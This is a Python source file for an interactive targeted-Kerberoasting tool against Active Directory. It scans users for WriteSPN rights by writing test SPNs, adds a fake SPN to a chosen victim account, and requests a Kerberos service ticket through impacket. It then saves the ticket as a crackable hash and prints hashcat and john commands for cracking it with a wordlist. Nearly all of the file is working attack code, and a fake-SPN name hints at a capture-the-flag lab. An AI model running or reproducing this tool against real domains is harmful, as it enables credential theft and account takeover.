#!/usr/bin/env python3


from __future__ import division
from __future__ import print_function

import getpass
import logging
import sys
import signal
import re
import os
from binascii import hexlify

import ldap3
from ldap3 import Server, Connection, ALL, MODIFY_ADD, MODIFY_DELETE

from pyasn1.codec.der import decoder

from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ntlm import compute_lmhash, compute_nthash

import threading

_interrupt_event = threading.Event()

def _signal_handler(signum, frame):
    _interrupt_event.set()
    raise KeyboardInterrupt

signal.signal(signal.SIGINT, _signal_handler)

class C:
    H  = '[95m'
    B  = '[94m'
    G  = '[92m'
    Y  = '[93m'
    R  = '[91m'
    X  = '[0m'
    BD = '[1m'
    DIM = '[2m'

FAKE_SPN = "fake/kerberoast.ctf.local"
TEST_SPN = "test/scan.temp"

# ── Signal handling for graceful shutdown (SIGTERM/SIGBREAK only) ──
def _signal_handler(signum, frame):
    print("\n[!] Terminated by signal %d. Shutting down..." % signum)
    sys.exit(128 + signum)

signal.signal(signal.SIGTERM, _signal_handler)
if hasattr(signal, "SIGBREAK"):
    signal.signal(signal.SIGBREAK, _signal_handler)
# NOTE: We do NOT trap SIGINT. Ctrl+C raises KeyboardInterrupt naturally,
# which is caught cleanly by the try/except blocks.

# ── HELPERS ──────────────────────────────────────────────────

def banner(msg):
    inner = 78
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔{'═' * inner}╗{C.X}")
    print(f"{C.BD}{C.B}{pad(msg)}{C.X}")
    print(f"{C.BD}{C.B}╚{'═' * inner}╝{C.X}")

def ok(msg):   print(f"  [+] {msg}")
def info(msg): print(f"  [*] {msg}")
def warn(msg): print(f"  [!] {msg}")
def fail(msg): print(f"  [-] {msg}"); sys.exit(1)

def domain_to_dn(domain):
    return ",".join(f"DC={x}" for x in domain.split("."))

# ── Input validation helpers ──────────────────────────────────

def _validate_non_empty(value, label="Value"):
    if not value or not value.strip():
        raise ValueError(f"{label} cannot be empty.")


def _validate_domain(value):
    _validate_non_empty(value, "Domain")
    if not re.match(r"^[a-zA-Z0-9._-]+$", value):
        raise ValueError("Domain contains invalid characters.")


def _validate_ip(value):
    _validate_non_empty(value, "IP")
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, value):
        raise ValueError("Invalid IP format. Expected: 192.168.1.10")
    parts = value.split(".")
    for part in parts:
        try:
            num = int(part)
        except ValueError:
            raise ValueError("IP contains non-numeric octets.")
        if not 0 <= num <= 255:
            raise ValueError("IP octets must be 0-255.")


def _validate_username(value):
    _validate_non_empty(value, "Username")
    if not re.match(r"^[a-zA-Z0-9._\-$]+$", value):
        raise ValueError("Username contains invalid characters.")


def _safe_input(prompt, validator=None, required=True, default=None):
    """Robust input with validation and interrupt handling."""
    while True:
        try:
            display = f"  {prompt}: "
            val = input(display).strip()
            if not val and default is not None:
                val = default
            if required and not val:
                print("  [-] This field is required.")
                continue
            if validator and val:
                try:
                    validator(val)
                except ValueError as ve:
                    print(f"  [-] {ve}")
                    continue
            return val
        except (KeyboardInterrupt, EOFError):
            print("\n  [!] Cancelled by user. Exiting.")
            sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            print(f"  [-] Input error: {e}")
            if required:
                continue
            return default if default is not None else ""


def _safe_getpass(prompt):
    """Secure password input with interrupt handling."""
    try:
        return getpass.getpass(f"  {prompt}: ")
    except (KeyboardInterrupt, EOFError):
        print("\n  [!] Cancelled by user. Exiting.")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        print(f"  [-] Password input error: {e}")
        return ""


# ── STEP 1: LDAP Connect ───────────────────────────────────

def ldap3_connect(dc_ip, domain, username, password):
    banner("Connecting to LDAP")
    try:
        server = Server(dc_ip, get_info=ALL)
    except Exception as e:
        fail(f"Failed to create LDAP server object: {e}")

    try:
        conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=ldap3.NTLM,
            auto_bind=True,
        )
        ok(f"LDAP bind successful as {domain}\\{username}")
        return conn
    except ldap3.core.exceptions.LDAPBindError as e:
        fail(f"LDAP bind failed (invalid credentials?): {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
        fail(f"Cannot connect to LDAP server at {dc_ip}: {e}")
    except ldap3.core.exceptions.LDAPSocketReceiveError as e:
        fail(f"LDAP connection dropped: {e}")
    except Exception as e:
        fail(f"LDAP connection failed: {type(e).__name__}: {e}")


# ── STEP 2: Auto-Find Vulnerable Users ─────────────────────

def find_vulnerable_users(conn, base_dn, attacker_sam):
    banner("Auto-Finding Vulnerable Users (WriteSPN)")
    info("Scanning all enabled users and testing WriteSPN permissions...")
    info("This may take a moment...")

    try:
        conn.search(
            search_base=base_dn,
            search_filter=(
                "(&(objectClass=user)(objectCategory=person)"
                f"(!(sAMAccountName={attacker_sam}))"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            ),
            attributes=[
                "sAMAccountName",
                "distinguishedName",
                "servicePrincipalName",
                "description",
            ],
        )
    except ldap3.core.exceptions.LDAPException as e:
        fail(f"LDAP search failed: {e}")
    except Exception as e:
        fail(f"Unexpected error during LDAP search: {e}")

    if not conn.entries:
        fail("No users found")

    candidates = []
    for entry in conn.entries:
        try:
            sam  = str(entry.sAMAccountName) if entry.sAMAccountName else ""
            dn   = str(entry.distinguishedName) if entry.distinguishedName else ""
            spns = list(entry.servicePrincipalName) if entry.servicePrincipalName else []
            desc = str(entry.description) if entry.description else ""
            if sam:
                candidates.append({"sam": sam, "dn": dn, "spns": spns, "desc": desc})
        except Exception as e:
            warn(f"Error parsing LDAP entry: {e}")
            continue

    info(f"Found {len(candidates)} enabled users to test")

    vulnerable = []
    tested = 0

    for user in candidates:
        tested += 1
        try:
            conn.modify(
                user["dn"],
                {"servicePrincipalName": [(MODIFY_ADD, [TEST_SPN])]},
            )

            if conn.result["result"] == 0:
                ok(f"WriteSPN confirmed on {user['sam']}")
                vulnerable.append(user)

                try:
                    conn.modify(
                        user["dn"],
                        {"servicePrincipalName": [(MODIFY_DELETE, [TEST_SPN])]},
                    )
                    if conn.result["result"] != 0:
                        warn(f"Could not remove test SPN from {user['sam']} - manual cleanup may be needed")
                except Exception as e:
                    warn(f"Error removing test SPN from {user['sam']}: {e}")
        except ldap3.core.exceptions.LDAPException as e:
            logging.debug(f"LDAP modify error for {user['sam']}: {e}")
        except Exception as e:
            logging.debug(f"Unexpected error testing {user['sam']}: {e}")

    info(f"Tested {tested} users, found {len(vulnerable)} vulnerable")
    return vulnerable


# ── STEP 3: YOU Pick the Target ────────────────────────────

def select_target(vulnerable_users):
    banner("Select Your Target")

    if not vulnerable_users:
        fail("No vulnerable users found. Check that your account has GenericWrite/GenericAll/WriteSPN over a user.")

    no_spn = [u for u in vulnerable_users if not u["spns"]]
    has_spn = [u for u in vulnerable_users if u["spns"]]

    info(f"Vulnerable users without SPN: {len(no_spn)}")
    info(f"Vulnerable users with SPN:    {len(has_spn)}")

    print(f"\n  {'#':<5} {'Username':<30} {'Has SPN':<10} {'Description'}")
    print(f"  {'─'*5} {'─'*30} {'─'*10} {'─'*30}")

    display_list = no_spn + has_spn
    for i, u in enumerate(display_list):
        spn_status = "YES" if u["spns"] else "NO"
        desc = u["desc"][:35] if u["desc"] else ""
        print(f"  {i:<5} {u['sam']:<30} {spn_status:<10} {desc}")

    print()
    while True:
        try:
            raw = input(f"  Select target # [0-{len(display_list)-1}]: ").strip()
            if not raw:
                print("  [-] Selection is required.")
                continue
            idx = int(raw)
            if 0 <= idx < len(display_list):
                target = display_list[idx]
                ok(f"You selected: {target['sam']}")
                return target
            else:
                print(f"  [-] Invalid selection: {idx}. Must be between 0 and {len(display_list)-1}.")
        except ValueError:
            print("  [-] Invalid input. Please enter a number.")
        except (KeyboardInterrupt, EOFError):
            print("\n  [!] Cancelled by user. Exiting.")
            sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            print(f"  [-] Input error: {e}")


# ── STEP 4: Add Fake SPN ───────────────────────────────────

def add_fake_spn(conn, target):
    banner("Adding Fake SPN (WriteSPN Abuse)")

    if FAKE_SPN in target["spns"]:
        warn("Fake SPN already exists - skipping")
        return True

    try:
        conn.modify(
            target["dn"],
            {"servicePrincipalName": [(MODIFY_ADD, [FAKE_SPN])]},
        )
    except ldap3.core.exceptions.LDAPException as e:
        fail(f"LDAP modify failed: {e}")
    except Exception as e:
        fail(f"Unexpected error adding SPN: {e}")

    if conn.result["result"] == 0:
        ok(f"SPN '{FAKE_SPN}' added to {target['sam']}")
        return True
    else:
        fail(
            f"Failed to add SPN: {conn.result.get('description', 'Unknown error')}\n"
            f"  Check that your user has WriteSPN/GenericWrite over {target['sam']}"
        )


# ── STEP 5: Get TGT ────────────────────────────────────────

def get_tgt(username, password, domain, dc_ip):
    try:
        user_p = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value,
        )
    except Exception as e:
        fail(f"Failed to create Principal object: {e}")

    if password:
        try:
            lmhash = compute_lmhash(password)
            nthash = compute_nthash(password)
        except Exception as e:
            warn(f"Hash computation failed: {e}, trying cleartext...")
            lmhash = b""
            nthash = b""

        if lmhash and nthash:
            try:
                tgt, cipher, old_key, session_key = getKerberosTGT(
                    user_p, "",
                    domain,
                    lmhash,
                    nthash,
                    "",
                    kdcHost=dc_ip,
                )
                ok("TGT obtained (RC4 forced via NTLM hash)")
                return tgt, cipher, old_key, session_key
            except Exception as e:
                logging.debug(f"RC4 TGT failed ({e}), trying cleartext...")

    try:
        tgt, cipher, old_key, session_key = getKerberosTGT(
            user_p, password, domain,
            b"", b"", "",
            kdcHost=dc_ip,
        )
        ok("TGT obtained (cleartext)")
        return tgt, cipher, old_key, session_key
    except Exception as e:
        fail(f"TGT request failed: {e}")


# ── STEP 6: Output TGS Hash ────────────────────────────────

def output_tgs_hash(ticket, username, spn, domain, fd=None):
    try:
        decoded = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
    except Exception as e:
        warn(f"Failed to decode TGS ticket: {e}")
        return None

    try:
        enc     = decoded["ticket"]["enc-part"]
        etype   = int(enc["etype"])
        realm   = str(decoded["ticket"]["realm"])
    except Exception as e:
        warn(f"Failed to extract ticket fields: {e}")
        return None

    try:
        if etype == constants.EncryptionTypes.rc4_hmac.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                etype,
                username,
                realm,
                spn.replace(":", "~"),
                hexlify(enc["cipher"][:16].asOctets()).decode(),
                hexlify(enc["cipher"][16:].asOctets()).decode(),
            )
        elif etype in (
            constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
            constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        ):
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                etype,
                username,
                realm,
                spn.replace(":", "~"),
                hexlify(enc["cipher"][-12:].asOctets()).decode(),
                hexlify(enc["cipher"][:-12:].asOctets()).decode(),
            )
        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                etype,
                username,
                realm,
                spn.replace(":", "~"),
                hexlify(enc["cipher"][:16].asOctets()).decode(),
                hexlify(enc["cipher"][16:].asOctets()).decode(),
            )
        else:
            warn(f"Unsupported etype {etype} - skipping hash output")
            return None
    except Exception as e:
        warn(f"Hash formatting failed: {e}")
        return None

    if fd:
        try:
            fd.write(entry + "\n")
        except OSError as e:
            warn(f"Failed to write hash to file: {e}")

    ok(f"Hash type: etype {etype}")
    return entry


# ── STEP 7: Full Kerberoast ──────────────────────────────

def kerberoast_target(domain, dc_ip, atk_user, atk_pass, target_sam, spn, out_file):
    banner("Kerberoasting Target")

    info(f"Getting TGT for {atk_user}@{domain}")
    tgt, cipher, old_key, session_key = get_tgt(atk_user, atk_pass, domain, dc_ip)

    info(f"Requesting TGS for {target_sam}")
    tgs = None
    cipher2 = None
    old_key2 = None
    session_key2 = None

    try:
        principal = Principal()
        principal.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
        principal.components = [f"{domain}\\{target_sam}"]

        tgs, cipher2, old_key2, session_key2 = getKerberosTGS(
            principal,
            domain,
            dc_ip,
            tgt,
            cipher,
            session_key,
        )
        ok("TGS obtained!")
    except Exception as e:
        warn(f"NT_MS_PRINCIPAL failed ({e}), trying NT_SRV_INST...")
        try:
            spn_p = Principal(
                spn,
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )
            tgs, cipher2, old_key2, session_key2 = getKerberosTGS(
                spn_p, domain, dc_ip, tgt, cipher, session_key,
            )
            ok("TGS obtained (fallback method)!")
        except Exception as e2:
            fail(f"Both TGS methods failed: {e2}")

    hash_file = out_file + ".hash"
    entry = None
    try:
        with open(hash_file, "w") as fd:
            entry = output_tgs_hash(tgs, target_sam, spn, domain, fd)
    except OSError as e:
        fail(f"Failed to open hash file for writing: {e}")
    except Exception as e:
        fail(f"Unexpected error writing hash file: {e}")

    if entry:
        ok(f"Hash saved → {hash_file}")
        print()
        print("  ┌─ Crack ──────────────────────────────────────────────────────┐")
        print(f"  │  hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt")
        print(f"  │  john   --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}")
        print("  └──────────────────────────────────────────────────────────────┘")
    else:
        warn("Hash could not be formatted")

    try:
        cc = CCache()
        cc.fromTGS(tgs, old_key2, session_key2)
        cc.saveFile(out_file + ".ccache")
        ok(f"ccache saved → {out_file}.ccache")
    except OSError as e:
        warn(f"ccache save failed (disk error): {e}")
    except Exception as e:
        warn(f"ccache save failed: {e}")

    return tgs, old_key2, session_key2


# ── STEP 8: Cleanup ────────────────────────────────────────

def cleanup_spn(conn, target):
    banner("Cleanup - Removing Fake SPN")
    try:
        conn.modify(
            target["dn"],
            {"servicePrincipalName": [(MODIFY_DELETE, [FAKE_SPN])]},
        )
    except ldap3.core.exceptions.LDAPException as e:
        warn(f"LDAP modify failed during cleanup: {e}")
        return
    except Exception as e:
        warn(f"Unexpected error during cleanup: {e}")
        return

    if conn.result["result"] == 0:
        ok("Fake SPN removed - account restored")
    else:
        warn(f"Cleanup failed: {conn.result.get('description', 'Unknown error')}")


# ── MAIN ─────────────────────────────────────────────────────

def main():
    print(f"{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.BD}{C.B}║  TARGETED KERBEROASTING — AUTO-FIND + MANUAL PICK                            ║{C.X}")
    print(f"{C.BD}{C.B}║  Auto-finds WriteSPN targets, YOU choose which to roast                      ║{C.X}")
    print(f"{C.BD}{C.B}║                                                                              ║{C.X}")
    print(f"{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}")

    banner("Configuration")

    domain   = _safe_input("Domain", validator=_validate_domain)
    dc_ip    = _safe_input("DC IP", validator=_validate_ip)
    username = _safe_input("Username", validator=_validate_username)
    password = _safe_getpass("Password")

    out_file_raw = input("  Output   [tgs_output]: ").strip()
    out_file = out_file_raw or "tgs_output"

    base_dn = domain_to_dn(domain)

    # Step 1: LDAP connect
    conn = ldap3_connect(dc_ip, domain, username, password)

    # Step 2: Auto-find vulnerable users
    try:
        vulnerable = find_vulnerable_users(conn, base_dn, username)
    except SystemExit:
        raise
    except Exception as e:
        fail(f"Unexpected error finding vulnerable users: {e}")

    # Step 3: YOU pick the target
    try:
        target = select_target(vulnerable)
    except SystemExit:
        raise
    except Exception as e:
        fail(f"Unexpected error selecting target: {e}")

    # Step 4: Add SPN or use existing
    spn_to_use = FAKE_SPN
    added_fake = False

    if target["spns"]:
        info(f"Target already has SPN(s): {target['spns']}")
        while True:
            try:
                ans = input("  Use existing SPN? [Y/n]: ").strip().lower()
                break
            except (KeyboardInterrupt, EOFError):
                print("\n  [!] Cancelled by user. Exiting.")
                sys.exit(0)
            except SystemExit:
                raise
            except Exception as e:
                print(f"  [-] Input error: {e}")

        if ans != "n":
            spn_to_use = target["spns"][0]
            info(f"Using existing SPN: {spn_to_use}")
        else:
            add_fake_spn(conn, target)
            added_fake = True
    else:
        add_fake_spn(conn, target)
        added_fake = True

    # Step 5: Kerberoast
    try:
        kerberoast_target(
            domain, dc_ip,
            username, password,
            target["sam"], spn_to_use,
            out_file,
        )
    except SystemExit:
        raise
    except Exception as e:
        fail(f"Unexpected error during kerberoasting: {e}")

    # Step 6: Cleanup
    if added_fake:
        while True:
            try:
                ans = input("\n  Remove fake SPN? [Y/n]: ").strip().lower()
                break
            except (KeyboardInterrupt, EOFError):
                print("\n  [!] Cancelled by user. Exiting.")
                sys.exit(0)
            except SystemExit:
                raise
            except Exception as e:
                print(f"  [-] Input error: {e}")

        if ans != "n":
            cleanup_spn(conn, target)

    try:
        conn.unbind()
    except Exception as e:
        warn(f"LDAP unbind warning: {e}")

    banner("DONE")
    ok("Targeted Kerberoasting complete!")
    ok(f"Crack: hashcat -m 13100 {out_file}.hash /usr/share/wordlists/rockyou.txt --force")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted by user. Exiting cleanly.")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        print(f"\n  [-] Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
